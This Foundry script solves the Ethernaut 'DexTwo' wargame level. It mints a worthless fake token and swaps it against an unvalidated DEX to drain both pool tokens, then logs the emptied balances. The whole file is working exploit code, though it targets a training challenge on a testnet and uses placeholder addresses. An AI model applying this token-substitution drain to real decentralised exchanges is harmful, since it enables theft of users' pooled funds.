// SPDX-License-Identifier: UNLICENSED
// forge script ./script/HackDexTwo.s.sol --private-key $ETHERNAUGHT_PRIVATE_KEY --broadcast --rpc-url $GORELI_OPTIMISIM_RPC -vvvv
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/DexTwo.sol";
import "../src/HackToken.sol";

contract HackDex is Script {

    address attacker = payable(0xA); // Attacker address
    DexTwo dextwo = DexTwo(0xD); // Ethernaut DexTwo address
    HackToken cdsu;

    function run() external{
        // Labelling for console output
        vm.label(address(dextwo), "DexTwo");
        vm.label(attacker, "Attacker");

        address token1 = dextwo.token1();
        vm.label(token1, "Token1");
        address token2 = dextwo.token2();
        vm.label(token2, "Token2");

        vm.startBroadcast();
        
        // Create CDSU Token with 500 initial balance
        cdsu = new HackToken("NOT USDC", "CDSU", 400);
        require(cdsu.balanceOf(attacker) == 400, "HackToken Not Initialised");
        vm.label(address(cdsu), "HackToken");

        // ACDSU approvals and send 100 from attacker to dex
        cdsu.approve(attacker, 100);
        cdsu.approve(address(dextwo), 300);
        cdsu.transferFrom(attacker,address(dextwo), 100);
        
        // Dex approvals for CDSU, Token1 & Token2
        dextwo.approve(address(dextwo), 200);

        // Runt the swaps
        dextwo.swap(address(cdsu), token1, 100);
        dextwo.swap(address(cdsu), token2, 200);
        
        vm.stopBroadcast();

        // Check dex drained of Token1 and Token2
        console.log("Final token1 balance of DexTwo is : ", dextwo.balanceOf(token1, address(dextwo)));
        console.log("Final token2 balance of DexTwo is : ", dextwo.balanceOf(token2, address(dextwo)));
    }
}
